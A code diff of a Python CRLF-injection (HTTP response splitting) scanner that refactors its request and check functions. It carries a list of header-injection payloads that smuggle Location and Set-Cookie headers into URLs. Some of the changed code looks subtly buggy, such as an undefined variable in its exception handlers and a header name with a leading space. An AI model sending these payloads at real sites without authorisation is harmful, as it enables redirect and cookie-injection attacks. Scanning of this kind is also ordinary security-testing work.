@@ -1,5 +1,6 @@
 from core.others import good,bad,info,requester,proxies,requests,multitest
-RedirectCodes = [i for i in range(300,311,1)]
+redirectCodes = [i for i in range(300,311,1)]
+errorCodes = [error for error in range(400, 411, 1)]
 payloads = [
             r"%0d%0aLocation:www.google.com%0d%0a",
             r"%0d%0aSet-Cookie:name=ch33ms;",
@@ -20,7 +21,6 @@ payloads = [
             r"\r\tSet-Cookie:name=ch33ms;",
             r"%5cr%5cnLocation:www.google.com",
             r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
-            r"\r\n Header-Test:BLATRUC",
             r"\rSet-Cookie:name=ch33ms;",
             r"\r%20Set-Cookie:name=ch33ms;",
             r"\r\nSet-Cookie:name=ch33ms;",
@@ -29,67 +29,45 @@ payloads = [
             r"\r\tSet-Cookie:name=ch33ms;"
             ]
 #---------------------------------------------------------------------#
-def CrlfScan(url,Foxy):
-    result = multitest(url,payloads)
-    if type(result) is tuple:
-        for params in result[0]:
-            TestingBreak = request(result[1],Foxy,params)
-            if TestingBreak:
+def crlfScan(url,foxy):
+    global payloadIndexCounter
+    payloadIndexCounter = 0
+
+    paramUrlTuple = multitest(url,payloads)
+    if type(paramUrlTuple) is tuple:
+        for params in paramUrlTuple[0]:
+            testingBreak = request(paramUrlTuple[1],foxy,params)
+            payloadIndexCounter += 1
+            if testingBreak:
                 break
     else:
-        for url in result:
-            TestingBreak = request(url,Foxy)
-            if TestingBreak:
+        for url in paramUrlTuple:
+            testingBreak = request(url,foxy)
+            payloadIndexCounter += 1
+            if testingBreak:
                 break
 
-def request(Uri,Foxy,Params='',PayloadIndex=0):
-    skip = 1
-    if Foxy:
-        try:
-            page = requester(Uri,True,Params)
-        except requests.exceptions.Timeout:
-            print("[\033[91mTimeout\033[00m] %s" % url)
-            return skip
-        except requests.exceptions.ConnectionError:
-            print("%s Connection Error" % bad)
-            return skip
-    else:
-        try:
-            page = requester(Uri,False,Params)
-        except requests.exceptions.Timeout:
-            print("[\033[91mTimeout\033[00m] %s" % url)
-            return skip
-        except requests.exceptions.ConnectionError:
-            print("%s Connection Error" % bad)
-            return skip
-        except IndexError:
-            PayloadIndex = 0
+def request(URI,foxy,params=''):
+    try:
+        respOBJ = requester(URI,foxy,params)
+    except requests.exceptions.Timeout:
+        print("[\033[91mTimeout\033[00m] %s" % url)
+        return True
+    except requests.exceptions.ConnectionError:
+        print("%s Connection Error" % bad)
+        return True
 
-    function_break = BasicChecks(page,payloads[PayloadIndex],page.request.url)
-    PayloadIndex += 1
-    if function_break:
-        return skip  
+    funcBreak = basicChecks(respOBJ,respOBJ.request.url)
 
-def BasicChecks(PageVar,payload,url):
-    skip = 1
-    if 'Location' in payload and PageVar.status_code in RedirectCodes and PageVar.headers['Location'] == "www.google.com":
-        print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))
-    elif "Set-Cookie" in payload:
-        if PageVar.status_code != 404:
-            try:
-                if PageVar.headers['Set-Cookie'] == "name=ch33ms;":
-                    print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))
-            except KeyError:
-                return skip
+def basicChecks(respOBJ,url):
+    googles = ["https://www.google.com", "http://www.google.com", "google.com", "www.google.com"] 
 
-    if PageVar.status_code==404:
-        print("%s %s [\033[91m404\033[00m]" % (bad,url))
-        
-    elif PageVar.status_code==403:
-        print("%s %s [\033[91m403\033[00m]" % (bad,url))
-        
-    elif PageVar.status_code==400:
-        print("%s %s [\033[91m400\033[00m]" % (bad,url))
+    if respOBJ.headers.get('Location') in googles or respOBJ.headers.get(' Set-Cookie') == "name=ch33ms;":
+        print("%s HTTP Response Splitting found" % good)
+        print("%s Payload : %s" % (info, payloads[payloadIndexCounter]))
+
+    elif respOBJ.status_code in errorCodes:
+        print("%s %s [\033[91m%s\033[00m]" % (bad,url,respOBJ.status_code))
 
     else:
         print("%s Found nothing :: %s" % (bad,url))
